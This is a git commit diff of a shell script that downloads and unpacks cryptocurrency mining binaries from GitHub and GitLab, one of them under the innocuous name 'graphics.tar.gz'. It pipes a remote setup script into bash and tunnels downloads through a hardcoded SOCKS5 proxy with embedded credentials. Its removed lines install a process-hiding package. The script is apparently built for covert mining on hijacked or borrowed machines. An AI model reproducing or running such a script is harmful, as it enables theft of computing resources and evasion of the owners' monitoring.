d765a3a6bc48c6b544b27a82383f1e3c6f816fc7
oksila54 <124560356+oksila54@users.noreply.github.com>
2023-02-15 08:56:22 +0700

    Update and rename nim.sh to ni.sh

--- ni.sh
+++ ni.sh
@@ -2,25 +2,11 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
-sudo apt-get install -y nodejs
-
-apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
-
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
-
-npm i -g node-process-hider
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz
-tar -xf cpuminer-opt-linux.tar.gz
-
-wget https://gitlab.com/ubedx/ngopi/-/raw/main/noncerpro-cuda-linux-3.4.1.tar.gz
-
-tar xf noncerpro-cuda-linux-3.4.1.tar.gz
 wget https://gitlab.com/ubedx/ngopi/-/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
-
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
@@ -28,7 +14,6 @@ loglevel = 1
 socks5 = 137.184.34.110:443
 socks5_username = pejuang
 socks5_password = sedekah
-
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -38,18 +23,20 @@ sleep .2
 echo " "
 echo " "
 
-echo ""
+echo "******************************************************************"
 
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-echo ""
+echo "******************************************************************"
 
 echo " "
 echo " "
 
+./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/noncerpro-cuda-linux-3.4.1.tar.gz
+tar xf noncerpro-cuda-linux-3.4.1.tar.gz
 
 ./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/magicBezzHash.zip
 unzip magicBezzHash.zip
